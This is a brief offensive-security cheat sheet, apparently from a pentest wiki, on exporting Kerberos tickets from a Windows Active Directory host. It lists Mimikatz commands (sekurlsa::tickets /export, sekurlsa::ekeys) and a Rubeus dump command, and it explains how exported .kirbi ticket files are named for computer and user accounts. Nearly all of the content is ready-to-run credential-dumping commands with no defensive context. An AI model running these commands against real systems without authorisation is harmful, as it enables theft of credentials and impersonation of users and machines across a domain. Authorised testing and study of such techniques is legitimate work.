---
hidden: true
---

# Ticket/Hash Attacks

## Exporting Tickets

### **Mimikatz**

```powershell
sekurlsa::tickets /export
or if don't work try
sekurlsa::ekeys
```

The tickets ending with a <mark style="color:green;">**$**</mark> symbol represent the computer account, which requires a ticket to communicate with the **AD**. User tickets, on the other hand, include the user's name, followed by an <mark style="color:green;">**@**</mark> symbol that separates the service name and the domain. For example: <mark style="color:green;">**\[randomvalue]-username@service-domain.local.kirbi**</mark>.

### **Rubeus**

```powershell
Rubeus.exe dump /nowrap
```
